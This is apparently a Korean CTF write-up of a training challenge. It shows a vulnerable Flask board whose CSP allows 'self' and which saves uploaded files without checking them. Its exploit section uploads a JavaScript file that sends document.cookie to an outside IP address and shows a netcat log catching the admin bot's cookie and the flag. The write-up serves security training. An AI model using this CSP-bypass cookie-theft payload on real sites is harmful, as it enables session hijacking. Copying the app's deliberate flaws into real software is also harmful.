---
title: "[Writeup] Knockon Bootcamp - 6. XSS - mitigations"
categories:
  - Web Hacking
tags:
  - Writeup
  - Knockon Bootcamp
  - Cross Site Scripting
  - Stored XSS
last_modified_at: 2024-09-11T18:20:00-05:00
published: true
---

|

## 문제

<http://war.knock-on.org:10014/>

![6. XSS - mitigations 1](/assets/images/writeup/web-hacking/knock-on/6_XSS_1.png)

![6. XSS - mitigations 2](/assets/images/writeup/web-hacking/knock-on/6_XSS_2.png)


|

|

|

### 목표

---

게시판에 악성 스크립트를 추가하여 쿠키 값 탈취하기

|

### 공격 기법

---

Cross Site Scripting

- Stored XSS

|

|

|

## 문제 코드

```python
from flask import Flask, render_template, request, redirect, url_for, abort,send_file
from flask_sqlalchemy import SQLAlchemy
import secrets

import os
import requests

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By

app = Flask(__name__)

MYSQL_DATABASE = os.getenv("MYSQL_DATABASE")
MYSQL_USER = os.getenv("MYSQL_USER")
MYSQL_PASSWORD = os.getenv("MYSQL_PASSWORD")
MYSQL_HOST = os.getenv("MYSQL_HOST")
SECRET_KEY = os.getenv("ADMIN_SECRET_KEY")
CHROMEDRIVER_PATH = os.getenv("CHROMEDRIVER_PATH")
localhost = "http://localhost:10006"

app.secret_key = SECRET_KEY
app.config["SQLALCHEMY_DATABASE_URI"] = (
    f"mysql+pymysql://{MYSQL_USER}:{MYSQL_PASSWORD}@{MYSQL_HOST}/{MYSQL_DATABASE}"
)
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
db = SQLAlchemy(app)

class Post(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    password = db.Column(db.String(64), nullable=False)
    title = db.Column(db.String(64), nullable=False)
    content = db.Column(db.Text, nullable=False)
    image = db.Column(db.String(100))

    def __repr__(self):
        return f"Post('{self.title}', '{self.content}')"

nonce = secrets.token_hex(16)

#SCP설정
@app.after_request
def set_csp(response): 
    response.headers['Content-Security-Policy'] = f"script-src 'nonce-{nonce}' 'self'"
    return response

@app.route('/')
def index():
    posts = Post.query.all()
    global nonce
    nonce = secrets.token_hex(16)
    return render_template('index.html', posts=posts, nonce=nonce)

UPLOAD_FOLDER = 'uploads'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
if not os.path.exists(app.config['UPLOAD_FOLDER']):
    os.makedirs(app.config['UPLOAD_FOLDER'])

@app.route('/uploads/<path:filename>')
def uploaded_file(filename):
    return send_file(os.path.join(app.config['UPLOAD_FOLDER'], filename))

@app.route('/write', methods=['GET', 'POST'])
def write():
    if request.method == 'POST':
        content = request.form['content']
        title = request.form['title']
        password = request.form['password']
        image_file = request.files['image'] 

        if image_file:
            filename = (image_file.filename)
            image_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            image_file.save(image_path)
        else:
            image_path = None

        if len(password) < 4:
            return "Password must be at least 4 characters long."

        post = Post(content=content, password=password, title=title, image=filename)
        db.session.add(post)
        db.session.commit()
        return redirect(url_for('index'))
    return render_template('write.html')

@app.route('/post/<int:id>', methods=['GET', 'POST'])
def view_post(id):
    post = Post.query.get_or_404(id)
    if '127.0.0.1' == request.remote_addr: #if admin bot
        return render_template('post.html', post=post)
    if request.method == 'POST':
        global nonce
        nonce = secrets.token_hex(16)

        password = request.form['password']
        if password == post.password:
            return render_template('post.html', post=post,nonce=nonce)
        else:
            return "비밀번호가 일치하지 않습니다."
    return render_template('view_post.html', post=post)

@app.route('/delete/<int:id>')
def delete_post(id):
    post = Post.query.get_or_404(id)
    db.session.delete(post)
    db.session.commit()
    return redirect(url_for('index'))

def read_url(url, cookie={"name": "name", "value": "value"}):
    driver = None
    try:
        service = Service(executable_path=CHROMEDRIVER_PATH)

        options = webdriver.ChromeOptions()
        options.add_argument("--headless")
        options.add_argument("--window-size=1920x1080")
        options.add_argument("--disable-gpu")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")

        driver = webdriver.Chrome(service=service, options=options)

        driver.implicitly_wait(3)
        driver.set_page_load_timeout(10)

        driver.get(localhost)
        driver.add_cookie(cookie)
        driver.get(url)

    except Exception as e:
        if driver:
            driver.quit()
        return False
    finally:
        if driver:
            driver.quit()
        return True

@app.route("/admin/<int:post_id>", methods=["GET", "POST"])
def admin(post_id):
    target_url = localhost + f"/post/{post_id}"

    if requests.get(target_url).status_code == 404:
        message = f"Unvalid Post ID"
        posts = Post.query.all()
        return render_template("index.html", posts=posts, message=message)

    cookie = {"name": "cookie", "value": SECRET_KEY}
    success = read_url(target_url, cookie)

    if success:
        message = f"Bot activated successfully and visited: {target_url}"
    else:
        message = f"Bot activation failed: {target_url}"

    posts = Post.query.all()
    return render_template("index.html", posts=posts, message=message)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=10006, debug=True)
```

|

|

|

## 분석

### /write

---

![6. XSS - mitigations 3](/assets/images/writeup/web-hacking/knock-on/6_XSS_3.png)

파일 업로드 기능이 있음

|

|

|

## 코드 분석

### set_csp()

---

```python
#CSP설정
@app.after_request
def set_csp(response): 
    response.headers['Content-Security-Policy'] = f"script-src 'nonce-{nonce}' 'self'"
    return response
```

```python
@app.after_request
```

모든 요청 처리 후 응답

|

```python
response.headers['Content-Security-Policy'] = f"script-src 'nonce-{nonce}' 'self'"
```

`Content-Security-Policy` CSP정책. 헤더를 설정.

`nonce`: 서버에서 생성한 nonce를 사용해야만 인라인 스크립트 실행 허용

`self`: 현재 도메인의 스크립트만 실행 허용

|

|

### uploaded_file()

---

```bash
UPLOAD_FOLDER = 'uploads'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
if not os.path.exists(app.config['UPLOAD_FOLDER']):
    os.makedirs(app.config['UPLOAD_FOLDER'])

@app.route('/uploads/<path:filename>')
def uploaded_file(filename):
    return send_file(os.path.join(app.config['UPLOAD_FOLDER'], filename))
```

```python
UPLOAD_FOLDER = 'uploads'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
```

업로드된 파일을 저장할 폴더를 `uploads`로 설정 후 `config`설정 파일에 추가

|

```python
if not os.path.exists(app.config['UPLOAD_FOLDER']):
    os.makedirs(app.config['UPLOAD_FOLDER'])
```

파일 저장 경로가 없으면 자동으로 생성

|

```python
@app.route('/uploads/<path:filename>')
def uploaded_file(filename):
    return send_file(os.path.join(app.config['UPLOAD_FOLDER'], filename))
```

`/uploads/<path:filename>`경로로 접근 시 파일 제공

`파일 경로`와 `파일명`을 결합

|

|

### write()

---

```python
@app.route('/write', methods=['GET', 'POST'])
def write():
    if request.method == 'POST':
        content = request.form['content']
        title = request.form['title']
        password = request.form['password']
        image_file = request.files['image'] 

        if image_file:
            filename = (image_file.filename)
            image_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
            image_file.save(image_path)
       

        if len(password) < 4:
            return "Password must be at least 4 characters long."

        post = Post(content=content, password=password, title=title, image=filename)
        db.session.add(post)
        db.session.commit()
        return redirect(url_for('index'))
    return render_template('write.html')
```

|

```python
image_file = request.files['image']
```

업로드된 파일을 가져옴

|

```python
if image_file:
    filename = (image_file.filename)
    image_path = os.path.join(app.config['UPLOAD_FOLDER'], filename)
    image_file.save(image_path)
else:
    image_path = None
```

`image_file`이 있으면 파일 업로드 경로와 파일명을 합쳐 `image_path`에 저장 후 

`save` 메서드로 `image_path`에 파일 저장

파일이 없으면 `image_path`를 `None`으로 설정

|

|

|

## Exploit

```python
response.headers['Content-Security-Policy'] = f"script-src 'nonce-{nonce}' 'self'"
```

코드를 보면 `/`와 `/post`에서 `nonce`값이 계속 바뀜.

로컬에서는 프록시 툴 등으로 `nonce`값을 알아내어 스크립트를 실행할 수 있지만, 봇을 통해 쿠키를 탈취하는 과정에서는 바뀐 `nonce`를 직접 설정할 수 없어 스크립트 실행이 불가능함.

하지만 `self`로 **동일 출처의 외부 스크립트**는 실행 가능

파일을 업로드하고, 해당 파일 경로로 이동하여 스크립트를 실행하도록 해야함

|

```html
<script src="/uploads/test.js"></script>
```

```jsx
// test.js

location.href="http://20.41.120.97:10010/"+document.cookie
```

`src`는 HTML 속성이기 때문에 `nonce`와 관계 없이 실행됨

동일 출처에서 업로드된 외부파일인 `test.js`가 있는 파일 경로로 이동

`test.js`에는 공격자의 서버로 쿠키를 보내는 스크립트 코드를 작성

파일이 실행되면서 쿠키 탈취

|

|

### 결과

```sh
azureuser@php-dev-1:/var/www/html/uploads$ nc -l -p 10010
GET /cookie=K0%7BYou_are_insane!%7D HTTP/1.1
Host: 20.41.120.97:10010
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/128.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://localhost:10006/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

```

|

|

|

## Payload

### content

---

```html
<script src="/uploads/test.js"></script>
```

|

### test.js

```js
location.href="http://20.41.120.97:10010/"+document.cookie
```

|

|

### FLAG

---

```jsx
K0{You_are_insane!}
```

|

---